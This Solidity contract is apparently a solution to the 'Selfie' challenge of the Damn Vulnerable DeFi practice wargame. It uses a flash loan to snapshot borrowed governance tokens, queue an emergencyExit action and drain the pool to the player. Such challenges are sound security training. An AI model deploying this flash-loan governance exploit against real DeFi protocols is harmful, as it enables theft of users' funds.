// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20Snapshot} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

contract SelfiePoolAttack is IERC3156FlashBorrower{
    SelfiePool public immutable selfiePool;
    SimpleGovernance public immutable simpleGovernance;

    constructor(address _selfiePool, address _simpleGovernance) {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
    }

    function onFlashLoan(
        address /* initiator */,
        address token,
        uint256 amount,
        uint256 /* fee */,
        bytes calldata /* data */
    ) external returns (bytes32) {
        IERC20 erc20Token = IERC20(token);

        DamnValuableTokenSnapshot(token).snapshot();

        bytes memory queueData = abi.encodeWithSignature("emergencyExit(address)", address(this));
        simpleGovernance.queueAction(address(selfiePool), 0, queueData);

        
        erc20Token.approve(address(selfiePool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAction(address token, address player, uint256 amount) external {
        simpleGovernance.executeAction(1);

        IERC20(token).transfer(player, amount);
    }
}